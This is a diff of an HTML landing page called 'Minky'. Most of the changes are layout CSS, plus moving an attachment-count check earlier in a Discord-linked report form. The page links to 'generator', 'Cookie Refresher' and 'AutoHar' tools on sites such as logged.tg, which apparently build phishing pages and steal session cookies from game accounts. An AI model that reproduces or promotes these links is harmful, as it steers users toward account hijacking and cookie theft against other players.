@@ -6,20 +6,20 @@
   <title>Minky</title>
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       font-family: 'Orbitron', sans-serif;
       background: #000;
       color: #fff;
       margin: 0;
       padding: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: flex-start;
       min-height: 100vh;
       text-align: center;
       position: relative;
-      overflow-y: auto;
+      overflow: hidden; /* Prevents infinite scrolling */
     }
 
     body::before {
@@ -37,6 +37,18 @@
     @keyframes glow {
       from { transform: scale(1) rotate(0deg); }
       to { transform: scale(1.1) rotate(45deg); }
+    }
+
+    /* Container to limit scrollable area */
+    .page-container {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 40px 20px;
+      position: relative;
+      z-index: 1;
     }
 
     #member-count {
@@ -191,7 +203,7 @@
     /* FIXED NOTIFICATION - NOW VISIBLE & ANIMATED */
     #notification {
       position: fixed;
-      top: 80px; /* Lowered from -60px to 80px so it's visible below header elements */
+      top: 80px;
       left: 50%;
       transform: translateX(-50%) translateY(-10px);
       opacity: 0;
@@ -289,47 +301,49 @@
 <body>
   <canvas id="snow"></canvas>
 
-  <div id="member-count">
-    Server Members: <span id="count">—</span>
-    <button id="refresh-count">⟳</button>
+  <div class="page-container">
+    <div id="member-count">
+      Server Members: <span id="count">—</span>
+      <button id="refresh-count">⟳</button>
+    </div>
+
+    <div id="report-button">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 9V13M12 17V17.01M3 21H21L12 3L3 21Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+
+    <div id="report-ui">
+      <h2>Report</h2>
+      <p>Must be in the Discord server to get your response</p>
+      <input type="text" id="discord-username" placeholder="Your Discord Username">
+      <select id="category">
+        <option value="">Select Category</option>
+        <option value="bug">Report a Bug</option>
+        <option value="suggestion">Suggestion</option>
+        <option value="member">Report a Member</option>
+        <option value="site">Site Down</option>
+      </select>
+      <input type="text" id="reported-user" placeholder="Reported User Username" style="display:none;">
+      <textarea id="report-text" placeholder="Your Report"></textarea>
+      <input type="file" id="attachments" multiple accept="image/*,video/*">
+      <p class="attach-note">Optional / Max 10 attachments</p>
+      <button id="submit-report">Submit Report</button>
+    </div>
+
+    <div id="notification"></div>
+
+    <h1>Minky</h1>
+    <div class="links">
+      <a href="https://www.logged.tg/auth/minkybeams" class="link-btn" target="_blank">Main Generator</a>
+      <a href="https://immortal.st/?code=NjU5MTUxMzEwNzc3ODI3Nzc1MV85OTcxODE4OTgyODA4ODQwMjQ=" class="link-btn" target="_blank">Generator 2</a>
+      <a href="https://www.logged.tg/tools/refresher" class="link-btn" target="_blank">Cookie Refresher</a>
+      <a href="https://bloxhub.st/generator/Minky" class="link-btn" target="_blank">AutoHar</a>
+      <a href="https://discord.gg/PV3vVfc7s7" class="link-btn discord-btn" target="_blank">Discord Server</a>
+    </div>
+
+    <footer>© 2025 Minky</footer>
   </div>
-
-  <div id="report-button">
-    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <path d="M12 9V13M12 17V17.01M3 21H21L12 3L3 21Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-    </svg>
-  </div>
-
-  <div id="report-ui">
-    <h2>Report</h2>
-    <p>Must be in the Discord server to get your response</p>
-    <input type="text" id="discord-username" placeholder="Your Discord Username">
-    <select id="category">
-      <option value="">Select Category</option>
-      <option value="bug">Report a Bug</option>
-      <option value="suggestion">Suggestion</option>
-      <option value="member">Report a Member</option>
-      <option value="site">Site Down</option>
-    </select>
-    <input type="text" id="reported-user" placeholder="Reported User Username" style="display:none;">
-    <textarea id="report-text" placeholder="Your Report"></textarea>
-    <input type="file" id="attachments" multiple accept="image/*,video/*">
-    <p class="attach-note">Optional/Max 10 attachments</p>
-    <button id="submit-report">Submit Report</button>
-  </div>
-
-  <div id="notification"></div>
-
-  <h1>Minky</h1>
-  <div class="links">
-    <a href="https://www.logged.tg/auth/minkybeams" class="link-btn" target="_blank">Main Generator</a>
-    <a href="https://immortal.st/?code=NjU5MTUxMzEwNzc3ODI3Nzc1MV85OTcxODE4OTgyODA4ODQwMjQ=" class="link-btn" target="_blank">Generator 2</a>
-    <a href="https://www.logged.tg/tools/refresher" class="link-btn" target="_blank">Cookie Refresher</a>
-    <a href="https://bloxhub.st/generator/Minky" class="link-btn" target="_blank">AutoHar</a>
-    <a href="https://discord.gg/PV3vVfc7s7" class="link-btn discord-btn" target="_blank">Discord Server</a>
-  </div>
-
-  <footer>© 2025 Minky</footer>
 
   <script>
     // Snow Effect
@@ -474,6 +488,13 @@
       const category = categorySelect.value;
       const reportText = document.getElementById('report-text').value.trim();
       const reported = reportedUser.value.trim();
+      const attachments = document.getElementById('attachments').files;
+
+      // ✅ Fixed: Properly check file count
+      if (attachments.length > 10) {
+        showNotification('Maximum 10 attachments allowed', 'red');
+        return;
+      }
 
       if (!username || !category || !reportText || (category === 'member' && !reported)) {
         showNotification('Please fill all required fields', 'red');
@@ -496,12 +517,6 @@
 
       const formData = new FormData();
       formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
-
-      const attachments = document.getElementById('attachments').files;
-      if (attachments.length > 10) {
-        showNotification('Maximum 10 attachments allowed', 'red');
-        return;
-      }
 
       Array.from(attachments).forEach((file, index) => {
         formData.append(`files[${index}]`, file);
